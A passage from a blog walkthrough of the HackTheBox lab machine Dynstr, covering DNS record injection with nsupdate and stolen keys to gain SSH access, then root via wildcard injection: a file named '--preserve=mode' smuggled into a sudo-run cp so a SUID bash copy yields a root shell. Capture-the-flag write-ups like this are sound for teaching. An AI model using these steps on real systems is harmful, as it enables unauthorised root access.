</span></span><span class=line><span class=cl>include <span class=s2>&#34;/etc/bind/infra.key&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>zone <span class=s2>&#34;dyna.htb&#34;</span> IN <span class=o>{</span> <span class=nb>type</span> master<span class=p>;</span> file <span class=s2>&#34;dyna.htb.zone&#34;</span><span class=p>;</span> update-policy <span class=o>{</span> grant infra-key zonesub ANY<span class=p>;</span> <span class=o>}</span><span class=p>;</span> <span class=o>}</span><span class=p>;</span>
</span></span><span class=line><span class=cl>zone <span class=s2>&#34;10.in-addr.arpa&#34;</span> IN <span class=o>{</span> <span class=nb>type</span> master<span class=p>;</span> file <span class=s2>&#34;10.in-addr.arpa.zone&#34;</span><span class=p>;</span> update-policy <span class=o>{</span> grant infra-key zonesub ANY<span class=p>;</span> <span class=o>}</span><span class=p>;</span> <span class=o>}</span><span class=p>;</span>
</span></span><span class=line><span class=cl>zone <span class=s2>&#34;168.192.in-addr.arpa&#34;</span> IN <span class=o>{</span> <span class=nb>type</span> master<span class=p>;</span> file <span class=s2>&#34;168.192.in-addr.arpa.zone&#34;</span><span class=p>;</span> update-policy <span class=o>{</span> grant infra-key zonesub ANY<span class=p>;</span> <span class=o>}</span><span class=p>;</span> <span class=o>}</span><span class=p>;</span>
</span></span><span class=line><span class=cl>// Enable DynDNS updates to customer zones.
</span></span><span class=line><span class=cl>include <span class=s2>&#34;/etc/bind/ddns.key&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>zone <span class=s2>&#34;dnsalias.htb&#34;</span> IN <span class=o>{</span> <span class=nb>type</span> master<span class=p>;</span> file <span class=s2>&#34;dnsalias.htb.zone&#34;</span><span class=p>;</span> update-policy <span class=o>{</span> grant ddns-key zonesub ANY<span class=p>;</span> <span class=o>}</span><span class=p>;</span> <span class=o>}</span><span class=p>;</span>
</span></span><span class=line><span class=cl>zone <span class=s2>&#34;dynamicdns.htb&#34;</span> IN <span class=o>{</span> <span class=nb>type</span> master<span class=p>;</span> file <span class=s2>&#34;dynamicdns.htb.zone&#34;</span><span class=p>;</span> update-policy <span class=o>{</span> grant ddns-key zonesub ANY<span class=p>;</span> <span class=o>}</span><span class=p>;</span> <span class=o>}</span><span class=p>;</span>
</span></span><span class=line><span class=cl>zone <span class=s2>&#34;no-ip.htb&#34;</span> IN <span class=o>{</span> <span class=nb>type</span> master<span class=p>;</span> file <span class=s2>&#34;no-ip.htb.zone&#34;</span><span class=p>;</span> update-policy <span class=o>{</span> grant ddns-key zonesub ANY<span class=p>;</span> <span class=o>}</span><span class=p>;</span> <span class=o>}</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// *** WORK IN PROGRESS, see bindmgr.sh ***
</span></span><span class=line><span class=cl>// include <span class=s2>&#34;/etc/bind/named.conf.bindmgr&#34;</span><span class=p>;</span>
</span></span></code></pre></div><p>The idea here is to add a sub domain to <code>dyna.htb</code> zone, and it must be part of <code>infra.dyna.htb</code>, such as <code>iamf.infra.dyna.htb</code>. I will also point that domain to my IP so I can SSH from my machine. These all can be done with the following commands.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@dynstr:/etc/bind$ nsupdate -k ./infra.key
</span></span><span class=line><span class=cl>&gt; update add iamf.infra.dyna.htb <span class=m>3600</span> A 10.10.14.53
</span></span><span class=line><span class=cl>&gt; update add 53.14.10.10.in-addr.arpa. <span class=m>600</span> PTR iamf.infra.dyna.htb
</span></span><span class=line><span class=cl>&gt; show
</span></span><span class=line><span class=cl>Outgoing update query:
</span></span><span class=line><span class=cl><span class=p>;;</span> -&gt;&gt;HEADER<span class=s>&lt;&lt;- opco</span>de: UPDATE, status: NOERROR, id:      <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> flags:<span class=p>;</span> ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> UPDATE SECTION:
</span></span><span class=line><span class=cl>iamf.infra.dyna.htb.    <span class=m>0</span>       ANY     A
</span></span><span class=line><span class=cl>iamf.infra.dyna.htb.    <span class=m>3600</span>    IN      A       10.10.14.53
</span></span><span class=line><span class=cl>53.14.10.10.in-addr.arpa. <span class=m>600</span>   IN      PTR     iamf.infra.dyna.htb.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; send
</span></span></code></pre></div><p>I can confirm with dig that my domain has been added.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class=line><span class=cl>$ dig @10.10.10.244 iamf.infra.dyna.htb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf.infra.dyna.htb
</span></span><span class=line><span class=cl><span class=p>;</span> <span class=o>(</span><span class=m>1</span> server found<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> global options: +cmd
</span></span><span class=line><span class=cl><span class=p>;;</span> Got answer:
</span></span><span class=line><span class=cl><span class=p>;;</span> -&gt;&gt;HEADER<span class=s>&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class=m>56211</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> flags: qr aa rd<span class=p>;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> WARNING: recursion requested but not available
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>;;</span> OPT PSEUDOSECTION:
</span></span><span class=line><span class=cl><span class=p>;</span> EDNS: version: 0, flags:<span class=p>;</span> udp: <span class=m>4096</span>
</span></span><span class=line><span class=cl><span class=p>;</span> COOKIE: 7d13ea1a1d5d21b90100000060cb40c0b256362f3bd3da35 <span class=o>(</span>good<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> QUESTION SECTION:
</span></span><span class=line><span class=cl><span class=p>;</span>iamf.infra.dyna.htb.           IN      A
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>;;</span> ANSWER SECTION:
</span></span><span class=line><span class=cl>iamf.infra.dyna.htb.    <span class=m>3600</span>    IN      A       10.10.14.53
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>;;</span> Query time: <span class=m>59</span> msec
</span></span><span class=line><span class=cl><span class=p>;;</span> SERVER: 10.10.10.244#53<span class=o>(</span>10.10.10.244<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> WHEN: Thu Jun <span class=m>17</span> 08:31:59 EDT <span class=m>2021</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> MSG SIZE  rcvd: <span class=m>92</span>
</span></span></code></pre></div><h4 id=ssh-bindmgr>SSH bindmgr<a class=anchor aria-hidden=true href=#ssh-bindmgr>#</a></h4><p>Now I can SSH login as bindmgr</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «ssh-keys» «10.10.14.53»
</span></span><span class=line><span class=cl>$ ssh -i bindmgr_rsa bindmgr@10.10.10.244
</span></span><span class=line><span class=cl>Last login: Tue Jun  <span class=m>8</span> 19:19:17 <span class=m>2021</span> from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb
</span></span><span class=line><span class=cl>bindmgr@dynstr:~$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1001<span class=o>(</span>bindmgr<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1001<span class=o>(</span>bindmgr<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1001<span class=o>(</span>bindmgr<span class=o>)</span>
</span></span></code></pre></div><p>The flag:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bindmgr@dynstr:~$ ls -l
</span></span><span class=line><span class=cl>total <span class=m>8</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> bindmgr bindmgr <span class=m>4096</span> Mar <span class=m>13</span> 14:53 support-case-C62796521
</span></span><span class=line><span class=cl>-r-------- <span class=m>1</span> bindmgr bindmgr   <span class=m>33</span> Jun <span class=m>17</span> 10:51 user.txt
</span></span><span class=line><span class=cl>bindmgr@dynstr:~$ cat user.txt
</span></span><span class=line><span class=cl>6404e...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=enumeration-2>Enumeration<a class=anchor aria-hidden=true href=#enumeration-2>#</a></h4><p>Checking for sudo permissions reveals that <code>bindmgr</code> is allowed to run a script called <code>bindmgr.sh</code> as root.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bindmgr@dynstr:~$ sudo -l
</span></span><span class=line><span class=cl>sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> bindmgr on dynstr:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
</span></span><span class=line><span class=cl>    <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User bindmgr may run the following commands on dynstr:
</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: /usr/local/bin/bindmgr.sh
</span></span></code></pre></div><p>The author gives a well documented about what this script does.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/usr/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1># This script generates named.conf.bindmgr to workaround the problem</span>
</span></span><span class=line><span class=cl><span class=c1># that bind/named can only include single files but no directories.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># It creates a named.conf.bindmgr file in /etc/bind that can be included</span>
</span></span><span class=line><span class=cl><span class=c1># from named.conf.local (or others) and will include all files from the</span>
</span></span><span class=line><span class=cl><span class=c1># directory /etc/bin/named.bindmgr.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># NOTE: The script is work in progress. For now bind is not including</span>
</span></span><span class=line><span class=cl><span class=c1>#       named.conf.bindmgr.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># TODO: Currently the script is only adding files to the directory but</span>
</span></span><span class=line><span class=cl><span class=c1>#       not deleting them. As we generate the list of files to be included</span>
</span></span><span class=line><span class=cl><span class=c1>#       from the source directory they won&#39;t be included anyway.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>BINDMGR_CONF</span><span class=o>=</span>/etc/bind/named.conf.bindmgr
</span></span><span class=line><span class=cl><span class=nv>BINDMGR_DIR</span><span class=o>=</span>/etc/bind/named.bindmgr
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>indent<span class=o>()</span> <span class=o>{</span> sed <span class=s1>&#39;s/^/    /&#39;</span><span class=p>;</span> <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Check versioning (.version)</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;[+] Running </span><span class=nv>$0</span><span class=s2> to stage new configuration from </span><span class=nv>$PWD</span><span class=s2>.&#34;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[[</span> ! -f .version <span class=o>]]</span> <span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>42</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[[</span> <span class=s2>&#34;`cat .version 2&gt;/dev/null`&#34;</span> -le <span class=s2>&#34;`cat </span><span class=nv>$BINDMGR_DIR</span><span class=s2>/.version 2&gt;/dev/null`&#34;</span> <span class=o>]]</span> <span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>43</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Create config file that includes all files from named.bindmgr.</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;[+] Creating </span><span class=nv>$BINDMGR_CONF</span><span class=s2> file.&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;// Automatically generated file. Do not modify manually.\n&#39;</span> &gt; <span class=nv>$BINDMGR_CONF</span>
</span></span><span class=line><span class=cl><span class=k>for</span> file in * <span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>    <span class=nb>printf</span> <span class=s1>&#39;include &#34;/etc/bind/named.bindmgr/%s&#34;;\n&#39;</span> <span class=s2>&#34;</span><span class=nv>$file</span><span class=s2>&#34;</span> &gt;&gt; <span class=nv>$BINDMGR_CONF</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Stage new version of configuration files.</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;[+] Staging files to </span><span class=nv>$BINDMGR_DIR</span><span class=s2>.&#34;</span>
</span></span><span class=line><span class=cl>cp .version * /etc/bind/named.bindmgr/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Check generated configuration with named-checkconf.</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;[+] Checking staged configuration.&#34;</span>
</span></span><span class=line><span class=cl>named-checkconf <span class=nv>$BINDMGR_CONF</span> &gt;/dev/null
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[[</span> <span class=nv>$?</span> -ne <span class=m>0</span> <span class=o>]]</span> <span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;[-] ERROR: The generated configuration is not valid. Please fix following errors: &#34;</span>
</span></span><span class=line><span class=cl>    named-checkconf <span class=nv>$BINDMGR_CONF</span> 2&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=p>|</span> indent
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>44</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;[+] Configuration successfully staged.&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># *** TODO *** Uncomment restart once we are live.</span>
</span></span><span class=line><span class=cl>    <span class=c1># systemctl restart bind9</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[[</span> <span class=nv>$?</span> -ne <span class=m>0</span> <span class=o>]]</span> <span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;[-] Restart of bind9 via systemctl failed. Please check logfile: &#34;</span>
</span></span><span class=line><span class=cl>        systemctl status bind9
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;[+] Restart of bind9 via systemctl succeeded.&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span></code></pre></div><p>The first two <code>if</code> statement show that the script wants a file called <code>.version</code>, and since it looks from <code>$PWD</code>, I can create that file in anywhere.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bindmgr@dynstr:~$ <span class=nb>echo</span> <span class=s1>&#39;5&#39;</span> &gt; .version
</span></span></code></pre></div><p>Then when I run the script, it throws the following error.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bindmgr@dynstr:~$ sudo bindmgr.sh
</span></span><span class=line><span class=cl>sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr.
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Creating /etc/bind/named.conf.bindmgr file.
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Staging files to /etc/bind/named.bindmgr.
</span></span><span class=line><span class=cl>cp: -r not specified<span class=p>;</span> omitting directory <span class=s1>&#39;support-case-C62796521&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Checking staged configuration.
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> ERROR: The generated configuration is not valid. Please fix following errors:
</span></span><span class=line><span class=cl>    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/support-case-C62796521: file not found
</span></span></code></pre></div><p>And this one is interesting</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>cp: -r not specified<span class=p>;</span> omitting directory <span class=s1>&#39;support-case-C62796521&#39;</span>
</span></span></code></pre></div><p>If I trace it, the error come from these lines.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Stage new version of configuration files.</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;[+] Staging files to </span><span class=nv>$BINDMGR_DIR</span><span class=s2>.&#34;</span>
</span></span><span class=line><span class=cl>cp .version * /etc/bind/named.bindmgr/
</span></span></code></pre></div><p>According to <a href=https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/>Hackingarticles</a>, using <code>cp</code> with <code>*</code> can lead to wildcard injection.</p><h4 id=exploitation>Exploitation<a class=anchor aria-hidden=true href=#exploitation>#</a></h4><p>To exploit <code>cp</code> with <code>*</code> (wildcard), I will create a copy of the bash binary and set SUID permissions on it, and then I will create another file with a filename <code>--preserve=mode</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bindmgr@dynstr:/dev/shm$ <span class=nb>echo</span> <span class=s1>&#39;5&#39;</span> &gt; .version
</span></span><span class=line><span class=cl>bindmgr@dynstr:/dev/shm$ touch  <span class=s1>&#39;--preserve=mode&#39;</span>
</span></span><span class=line><span class=cl>bindmgr@dynstr:/dev/shm$ cp /bin/bash .
</span></span><span class=line><span class=cl>bindmgr@dynstr:/dev/shm$ chmod u+s bash
</span></span><span class=line><span class=cl>bindmgr@dynstr:/dev/shm$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>1164</span>
</span></span><span class=line><span class=cl>drwxrwxrwt  <span class=m>2</span> root    root        <span class=m>100</span> Jun <span class=m>17</span> 15:18  .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>17</span> root    root       <span class=m>3940</span> Jun <span class=m>17</span> 10:51  ..
</span></span><span class=line><span class=cl>-rwsr-sr-x  <span class=m>1</span> bindmgr bindmgr <span class=m>1183448</span> Jun <span class=m>17</span> 15:18  bash
</span></span><span class=line><span class=cl>-rw-rw-r--  <span class=m>1</span> bindmgr bindmgr       <span class=m>1</span> Jun <span class=m>17</span> 15:12 <span class=s1>&#39;--preserve=mode&#39;</span>
</span></span><span class=line><span class=cl>-rw-rw-r--  <span class=m>1</span> bindmgr bindmgr       <span class=m>2</span> Jun <span class=m>17</span> 14:47  .version
</span></span></code></pre></div><p><code>cp</code> will see that <code>--preserve=mode</code> file as name as a flag/option/switch, so it becomes</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ cp .version --preserve<span class=o>=</span>mode /etc/bind/named.bindmgr/
</span></span></code></pre></div><p>When I run <code>bindmgr.sh</code> again, it throws another error.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bindmgr@dynstr:/dev/shm$ sudo bindmgr.sh
</span></span><span class=line><span class=cl>sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Creating /etc/bind/named.conf.bindmgr file.
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Staging files to /etc/bind/named.bindmgr.
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Checking staged configuration.
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> ERROR: The generated configuration is not valid. Please fix following errors:
</span></span><span class=line><span class=cl>    /etc/bind/named.bindmgr/bash:1: unknown option <span class=s1>&#39;ELF☻☺☺...&#39;</span>
</span></span><span class=line><span class=cl>    /etc/bind/named.bindmgr/bash:14: unknown option <span class=s1>&#39;♥h□ȀE□♣&#39;</span>
</span></span><span class=line><span class=cl>    /etc/bind/named.bindmgr/bash:40: unknown option <span class=s1>&#39;□YF&#39;</span>
</span></span><span class=line><span class=cl>    /etc/bind/named.bindmgr/bash:40: unexpected token near <span class=s1>&#39;}&#39;</span>
</span></span></code></pre></div><p>But now under <code>/etc/bind/named.bindmgr</code>, I have a copy of bash with SUID permissions set to root.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bindmgr@dynstr:/dev/shm$ ls -la /etc/bind/named.bindmgr
</span></span><span class=line><span class=cl>total <span class=m>1168</span>
</span></span><span class=line><span class=cl>drwxr-sr-x <span class=m>2</span> root <span class=nb>bind</span>    <span class=m>4096</span> Jun <span class=m>17</span> 15:18 .
</span></span><span class=line><span class=cl>drwxr-sr-x <span class=m>3</span> root <span class=nb>bind</span>    <span class=m>4096</span> Jun <span class=m>17</span> 15:18 ..
</span></span><span class=line><span class=cl>-rwsr-sr-x <span class=m>1</span> root <span class=nb>bind</span> <span class=m>1183448</span> Jun <span class=m>17</span> 15:18 bash
</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> root <span class=nb>bind</span>       <span class=m>2</span> Jun <span class=m>17</span> 15:18 .version
</span></span></code></pre></div><p>Executing that bash with <code>-p</code> gives me a root shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bindmgr@dynstr:/dev/shm$ /etc/bind/named.bindmgr/bash -p
</span></span><span class=line><span class=cl>bash-5.0# id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1001<span class=o>(</span>bindmgr<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1001<span class=o>(</span>bindmgr<span class=o>)</span> <span class=nv>euid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>egid</span><span class=o>=</span>117<span class=o>(</span><span class=nb>bind</span><span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>117<span class=o>(</span><span class=nb>bind</span><span class=o>)</span>,1001<span class=o>(</span>bindmgr<span class=o>)</span>
</span></span><span class=line><span class=cl>bash-5.0# whoami
</span></span><span class=line><span class=cl>root
</span></span></code></pre></div><p>The flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bash-5.0# ls -l
</span></span><span class=line><span class=cl>total <span class=m>8</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> root root <span class=m>4096</span> Mar <span class=m>14</span> 14:18 cleanup
</span></span><span class=line><span class=cl>-r-------- <span class=m>1</span> root root   <span class=m>33</span> Jun <span class=m>17</span> 10:51 root.txt
</span></span><span class=line><span class=cl>bash-5.0# cat root.txt
</span></span><span class=line><span class=cl>64348...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><div class=post-references><h2>References</h2><ul><li><a href=https://www.noip.com/integrate/request target=_blank rel="noopener noreferrer">https://www.noip.com/integrate/request</a></li><li><a href=https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/ target=_blank rel="noopener noreferrer">https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/dns/>DNS</a></li><li><a href=https://fahmifj.github.io/tags/command-injection/>Command-injection</a></li><li><a href=https://fahmifj.github.io/tags/wildcard-injection/>Wildcard-injection</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Dynstr on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Dynstr&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fdynstr%2f&hashtags=Linux%2cDNS%2cCommand-injection%2cWildcard-injection"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Dynstr on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fdynstr%2f&title=HackTheBox%20-%20Dynstr&summary=HackTheBox%20-%20Dynstr&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fdynstr%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Dynstr on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fdynstr%2f&title=HackTheBox%20-%20Dynstr"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 